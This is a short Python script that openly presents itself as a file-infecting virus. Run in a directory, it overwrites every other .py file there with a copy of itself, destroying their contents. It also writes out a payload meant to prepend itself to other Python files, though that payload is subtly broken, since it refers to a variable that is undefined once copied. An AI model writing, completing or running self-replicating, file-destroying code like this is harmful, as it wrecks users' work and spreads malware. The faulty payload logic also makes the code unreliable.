import os
import shutil

# Define the virus code
virus_code = '''
import os
import shutil

# Function to infect other files
def infect_files():
    # Get the current directory
    current_dir = os.getcwd()
    
    # Loop through all files in the directory
    for file_name in os.listdir(current_dir):
        if file_name.endswith('.py') and file_name != os.path.basename(__file__):
            # Read the content of the file
            with open(file_name, 'r') as file:
                content = file.read()
            
            # Check if the file is already infected
            if 'import os\nimport shutil' in content:
                continue
            
            # Add the virus code to the file
            infected_content = virus_code + content
            
            # Write the infected content back to the file
            with open(file_name, 'w') as file:
                file.write(infected_content)
            
            print(f'Infected file: {file_name}')
    
    print('Infection complete.')

# Call the function to infect other files
infect_files()
'''

# Function to create copies of the virus in other files
def create_copies():
    # Get the current directory
    current_dir = os.getcwd()
    
    # Loop through all files in the directory
    for file_name in os.listdir(current_dir):
        if file_name.endswith('.py') and file_name != os.path.basename(__file__):
            # Create a copy of the virus in the file
            shutil.copy2(__file__, file_name)
            
            print(f'Copied virus to: {file_name}')
    
    print('Copying complete.')

# Call the function to create copies of the virus
create_copies()

# Save the virus code to a file
with open('virus.py', 'w') as file:
    file.write(virus_code)

print('Virus created.')
